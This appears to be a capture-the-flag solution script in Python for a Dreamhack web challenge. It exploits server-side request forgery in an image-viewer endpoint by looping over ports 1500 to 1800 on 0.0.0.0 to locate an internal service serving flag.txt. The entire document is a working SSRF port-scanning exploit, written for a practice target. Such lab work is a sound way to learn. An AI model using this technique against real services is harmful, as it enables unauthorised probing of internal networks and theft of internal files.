import requests

target_url = "http://host1.dreamhack.games:12713/img_viewer"

for i in range(1500, 1801):
    res = requests.post(target_url, data={'url': f'http://0.0.0.0:{i}/flag.txt'})

    print(f"URL: http://0.0.0.0:{i}/flag.txt")

    if "Jggg==" not in res.text:
        print()
        print(f'GOT {i}')
        break